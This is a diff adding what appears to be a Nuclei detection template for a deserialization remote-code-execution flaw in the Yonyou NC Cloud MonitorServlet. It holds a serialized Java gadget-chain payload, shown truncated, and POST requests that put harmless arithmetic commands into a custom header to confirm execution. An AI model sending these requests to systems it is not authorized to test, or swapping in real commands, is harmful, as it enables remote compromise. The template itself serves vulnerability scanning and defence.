@@ -1,0 +1,58 @@
+id: yonyou-nc-cloud-deserialization
+
+info:
+  name: Yonyou NC Cloud Deserialization RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects an RCE vulnerability in Yonyou NC Cloud MonitorServlet
+    by exploiting deserialization using crafted payloads.
+  reference:
+    - https://mp.weixin.qq.com/s/xVKuJb3DbKH0em0HoMZ4ZQ
+
+variables:
+  rInt1: "{{rand_int(800000000, 1000000000)}}"
+  rInt2: "{{rand_int(800000000, 1000000000)}}"
+  rb: |
+    "\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\fw\x08\x00\x00\x00\x10\x00\x00\x00\x01sr\x00\x04org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpt\x00\x00sr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\afactoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec(z\x97\x04\x02\x00\x01[\x00\riTransformerst\x00-[Lorg/apache/commons/collections/Transformer;xpur\x00-[Lorg.apache.commons.collections.Transformer;\xbdV*\xf1\xd84\x18\x99\x02\x00\x00xp\x00\x00\x00\x02sr\x00;org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\tiConstantq\x00~\x00\x03xpvr\x007com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00>org.apache.commons.collections.functors.InstantiateTransformer4\x8b\xf4\x7f\xa4\x86\xd0;\x02\x00\x02[\x00\x05iArgst\x00\x13[Ljava/lang/Object;[\x00\viParamTypest\x00\x12[Ljava/lang/Class;xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x01..."
+
+http:
+  - id: "r0"
+    method: POST
+    path:
+      - /servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet
+    headers:
+      Content-Type: "multipart/form-data"
+      X-T0KEN-INF0: "set /A {{rInt1}}+{{rInt2}}"
+    body: "{{rb}}"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-T0KEN"
+      - type: regex
+        part: header
+        regex:
+          - "{{base64(to_string(to_number(rInt1) + to_number(rInt2)))}}"
+
+  - id: "r1"
+    method: POST
+    path:
+      - /servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet
+    headers:
+      Content-Type: "multipart/form-data"
+      X-T0KEN-INF0: "expr {{rInt1}}+{{rInt2}}"
+    body: "{{rb}}"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-T0KEN"
+      - type: regex
+        part: header
+        regex:
+          - "{{base64(to_string(to_number(rInt1) + to_number(rInt2)))}}"
